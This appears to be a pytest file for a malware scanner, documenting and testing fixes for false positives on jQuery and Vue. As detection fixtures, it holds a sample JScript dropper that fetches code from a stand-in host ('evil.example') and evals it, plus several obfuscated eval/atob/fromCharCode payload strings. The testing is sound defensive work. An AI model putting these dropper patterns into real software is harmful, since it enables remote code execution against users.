"""jQuery and Vue are not malware, and the reasons they were called malware.

Submitted to the running product, `jquery-3.7.1.min.js` came back **malicious at
48.8** and `vue.global.js` **malicious at 40.5**. Neither contains anything
hostile. Three separate defects stacked up, and each one is a class of mistake
rather than a one-off:

1. **A Python builtin matched every language.** ``\\bexec\\s*\\(`` fired on
   JavaScript's ``RegExp.prototype.exec`` — jQuery has sixteen ``L.exec(t)`` —
   and ``\\bcompile\\s*\\(`` fired on Vue's own template compiler being a
   function named ``compile``. Both then read as "this file runs code from a
   string". They are now gated to the language they belong to, and require the
   call not to be a method call.

2. **A capability was treated as an intent.** Vue really does
   ``new Function(code)()``; so does every template engine, bundler and REPL.
   What a dropper cannot avoid is ALSO fetching, decoding or hiding the string
   it evaluates. `script.dynamic_execution` standing alone is now `low`, and
   counts in full the moment anything else in its family is raised. This is
   deliberately not a "the file says it is a library" waiver — a banner comment
   is one line to forge.

3. **A YARA rule matched two ordinary things far apart.** The old
   `JS_Obfuscation_Eval_Decode` was ``"eval" and any of ($decoders)`` as bare
   substrings, anywhere in the file. It fired on jQuery's own ``_evalUrl`` plus
   a ``String.fromCharCode`` forty kilobytes away, on ``curl.exe`` (which
   contains "retrieval" and "net/url.unescape"), on rclone's README and on a Go
   binary's ``trieval.go``.

Measured against every real malware sample on the detonation host (121 files,
including 205 fresh wide-corpus samples' contents):

    old rule fires on 5    new rule fires on 2

The three no longer matched are compiled binaries where the old rule hit
unrelated substrings; all three are still `malicious` at 78.6, 54.2 and 81.1 on
dynamic evidence. The two genuinely obfuscated JScript droppers — which use
``eval(String['fromCharCode'](0xeb95d^0xeb965,...))`` — are still caught, and
the rule now accepts bracket notation, which is the form the obfuscators
actually emit and which the first draft of this fix missed.

The 88-sample detonation fixture stores frozen signal ids, so it cannot see a
rule-pack change; that is why the cost above is measured against the samples on
disk instead.
"""
from __future__ import annotations

import glob
import hashlib
import os

import pytest

from app.engine import identify, scoring, verdict
from app.engine.analyzers import scripts
from app.engine.contracts import AnalyzerResult, IOCs, Sample, Signal

#: jQuery's shape: `.exec(` on a regex object, and `fromCharCode` a long way
#: from the one place the word "eval" appears.
JQUERY_SHAPE = (
    b"/*! jQuery v3.7.1 | (c) OpenJS Foundation | jquery.org/license */\n"
    b"var L=/^h\\d$/i,y=/\\[object (.+?)\\]/;"
    b"function f(e){var t=L.exec(e)||y.exec(e);return t&&t[1]}"
    b"ce._evalUrl&&ce._evalUrl(u.src,{nonce:t.nonce});"
    + b"function pad(n){return n<0?String.fromCharCode(n+65536):n}\n" * 400
)

#: Vue's shape: a real `new Function(code)()`, and nothing else.
VUE_SHAPE = (
    b"/*! Vue.js v3.4.21 | (c) 2018-present Yuxi (Evan) You | MIT */\n"
    b"function compile(src, options = {}) { return baseCompile(src, options) }\n"
    b"const { code } = compile(template, opts);\n"
    b"const render = new Function(code)();\n"
)

#: The same evaluation, by something that also had to go and get the payload.
DROPPER_SHAPE = (
    b"var x = new ActiveXObject('MSXML2.XMLHTTP');\n"
    b"x.open('GET','http://evil.example/p',false); x.send();\n"
    b"eval(x.responseText);\n"
)


def _analyse(tmp_path, name: str, payload: bytes):
    path = tmp_path / name
    path.write_bytes(payload)
    ident = identify.identify(str(path), name)
    sample = Sample(
        path=str(path), size_bytes=len(payload),
        sha256=hashlib.sha256(payload).hexdigest(),
        md5=hashlib.md5(payload).hexdigest(),
        mime=ident.mime, magic=ident.magic,
        claimed_extension=ident.claimed_extension, original_name=name,
        extension_mismatch=ident.extension_mismatch, family=ident.family,
    )
    result = scripts.analyze(sample)
    risk = scoring.assess([result], ioc_total=result.iocs.total())
    got = verdict.classify(sample.family, sample.mime, [result], result.iocs,
                           risk.final_score)
    return got, risk, {s.id for s in result.signals}


def _signal(sid: str, severity: str = "high") -> Signal:
    return Signal(id=sid, title=sid, severity=severity, detail="", evidence={})


# --- 1. a builtin belongs to its own language --------------------------------


def test_a_javascript_regex_is_not_a_python_exec(tmp_path) -> None:
    """`L.exec(t)` is `RegExp.prototype.exec`. jQuery has sixteen of them."""
    _got, _risk, ids = _analyse(tmp_path, "jquery.min.js", JQUERY_SHAPE)
    assert "script.dynamic_execution" not in ids


def test_a_python_exec_is_still_a_python_exec(tmp_path) -> None:
    _got, _risk, ids = _analyse(tmp_path, "stage2.py", b"exec(open('p').read())\n")
    assert "script.dynamic_execution" in ids


def test_a_python_method_call_is_not_a_builtin(tmp_path) -> None:
    """`re.compile(...)` and `codecs.encode(...)` are ordinary Python."""
    _got, _risk, ids = _analyse(
        tmp_path, "util.py", b"import re\nPAT = re.compile(r'^a+$')\nm = PAT.exec\n"
    )
    assert "script.dynamic_execution" not in ids


def test_a_published_library_reads_as_ordinary(tmp_path) -> None:
    got, risk, _ids = _analyse(tmp_path, "jquery.min.js", JQUERY_SHAPE)
    assert got.verdict == "clean", (got.to_dict(), risk.final_score)


# --- 2. evaluating a string is a capability, not an intent -------------------


def _classify(signals: list[Signal]):
    results = [AnalyzerResult(analyzer="script", ran=True, signals=signals)]
    assessment = scoring.assess(results, ioc_total=0)
    got = verdict.classify("script", "text/javascript", results, IOCs(),
                           assessment.final_score)
    return assessment.final_score, got


def test_evaluating_a_string_alone_is_not_evidence() -> None:
    alone = scoring.uncorroborated([_signal("script.dynamic_execution")])
    assert scoring.effective_severity(_signal("script.dynamic_execution"), alone) == "low"


def test_evaluating_a_string_counts_when_something_corroborates_it() -> None:
    signals = [_signal("script.dynamic_execution"),
               _signal("script.download_and_execute")]
    alone = scoring.uncorroborated(signals)
    assert scoring.effective_severity(signals[0], alone) == "high"


def test_the_dropper_that_fetches_what_it_evaluates_is_caught(tmp_path) -> None:
    """The whole point of the corroboration rule: it must not cost this."""
    got, risk, ids = _analyse(tmp_path, "invoice.js", DROPPER_SHAPE)
    assert "script.dynamic_execution" in ids
    assert got.verdict in ("malicious", "suspicious"), (got.to_dict(), risk.final_score)


def test_a_runtime_template_compiler_is_not_an_injector(tmp_path) -> None:
    got, risk, _ids = _analyse(tmp_path, "vue.global.js", VUE_SHAPE)
    assert got.verdict == "clean", (got.to_dict(), risk.final_score)


@pytest.mark.parametrize("banner", [
    b"/*! jQuery v3.7.1 | (c) OpenJS Foundation | jquery.org/license */\n",
    b"/**\n* vue v3.5.13\n* (c) 2018-present Yuxi (Evan) You\n* @license MIT\n**/\n",
    b"/*! Bootstrap v5.3.3 (https://getbootstrap.com/) */\n",
])
def test_a_library_banner_is_recognised(banner) -> None:
    """`_RE_LIBRARY_BANNER` was silently broken and nothing noticed, because a
    regex that never matches only makes the product *stricter*. jQuery kept
    tripping the minification signals for weeks with the waiver already written
    and deployed."""
    assert scripts._is_published_library(banner.decode() + "var x=1;")


def test_obfuscated_source_gets_no_banner_discount() -> None:
    for payload in (b"var _0x1a=['\\x61\\x6c'];eval(_0x1a[0]);",
                    b"/* build 1 */\nvar a=1;",
                    b"// jQuery v3.7.1\nvar a=1;"):
        assert not scripts._is_published_library(payload.decode())


def test_the_source_has_no_invisible_control_characters() -> None:
    r"""The banner regex above was dead for one reason: a patch went through a
    shell heredoc, `\b` lost its backslash, and the file ended up holding real
    0x08 BACKSPACE bytes. The pattern then required a backspace character before
    the version number, so it matched nothing — and a backspace is invisible in
    an editor, in a diff, and in a code review.

    Nothing legitimate in this codebase needs a control character outside tab
    and newline, so the cheapest possible guard is to say so.
    """
    import pathlib

    # THE WHOLE TREE, not just the engine.
    #
    # This used to root at `parents[2]` of the analyzer, which is `backend/app`.
    # A `\b` then went through a heredoc into a TEST docstring and became a real
    # 0x08 BACKSPACE, and this sweep did not cover the directory it was in.
    # Python noticed only because the `\w` that survived raised a SyntaxWarning;
    # had the pattern been `\bamsi` alone, nothing anywhere would have said a
    # word. The engine is not the only place a regex lives.
    root = pathlib.Path(scripts.__file__).resolve().parents[3]
    allowed = {9, 10, 13}
    suffixes = (
        "*.py", "*.yar", "*.ts", "*.tsx", "*.md", "*.sh", "*.yml", "*.yaml",
        "*.json", "*.toml", "*.cfg", "*.ini", "*.css",
    )
    skip = {"__pycache__", "node_modules", ".git", "dist", ".venv", ".wvenv"}
    offenders = []
    for suffix in suffixes:
        for path in sorted(root.rglob(suffix)):
            if skip & set(path.parts):
                continue
            data = path.read_bytes()
            for index, byte in enumerate(data):
                if byte < 32 and byte not in allowed:
                    line = data[:index].count(b"\n") + 1
                    offenders.append(
                        f"{path.relative_to(root)}:{line} byte 0x{byte:02x}")
                    break
    assert not offenders, offenders


def test_the_waiver_is_not_a_banner_comment() -> None:
    """A file claiming to be a published library gets no discount on anything
    that accuses it. Only the two signals a MINIFIER creates by construction —
    one long line, and the entropy of shortened identifiers — are waived."""
    source = scripts.__file__
    with open(source, encoding="utf-8") as fh:
        body = fh.read()
    waived = body.count("_is_published_library(")
    assert waived <= 3, (
        "the published-library check spread beyond entropy and line length; "
        "a banner comment is one line for an attacker to forge"
    )


# --- 3. two ordinary things far apart are not one obfuscated dropper --------


@pytest.fixture(scope="module")
def rules():
    yara = pytest.importorskip("yara")
    here = os.path.dirname(os.path.dirname(os.path.abspath(scripts.__file__)))
    paths = glob.glob(os.path.join(here, "rules", "*.yar"))
    assert paths, here
    return yara.compile(filepaths={os.path.basename(p): p for p in paths})


def _fires(rules, data: bytes) -> bool:
    return any(m.rule == "JS_Obfuscation_Eval_Decode" for m in rules.match(data=data))


@pytest.mark.parametrize("payload", [
    b"var x='cGF5bG9hZA==';eval(atob(x));",
    b"eval(unescape('%75%72%6c'));",
    b"eval(String.fromCharCode(97,108,101,114,116));",
    b"var s = atob(blob);\nvar r = s;\n// go\neval(r);\n",
    b"d=unescape(p);" + b" " * 120 + b"eval(d);",
    "eval(atob(q));".encode("utf-16le"),
    # The form the two real droppers on the detonation host actually use.
    b"_a=[String['fromCharCode'](eval(String['fromCharCode'](0xeb95d^0xeb965)))]",
    b"window['eval'](String['fromCharCode'](0x61,0x6c));",
])
def test_an_obfuscated_dropper_is_still_caught(rules, payload) -> None:
    assert _fires(rules, payload)


@pytest.mark.parametrize("payload", [
    # jQuery: `_evalUrl` is not a call to eval, and the decoder is 40 KB away.
    b"ce._evalUrl && ce._evalUrl(u.src)" + b"x" * 40000 + b"String.fromCharCode(n+65536)",
    # curl.exe and a Go binary: "retrieval" and "net/url.unescape" as symbols.
    b"vendor/golang.org/x/net/idna/trieval.go" + b"\x00" * 900 + b"net/url.unescape",
    # a method that happens to be named eval
    b"obj.eval(x); safeEval(y); atob(z);",
])
def test_two_ordinary_things_far_apart_do_not_fire(rules, payload) -> None:
    assert not _fires(rules, payload)
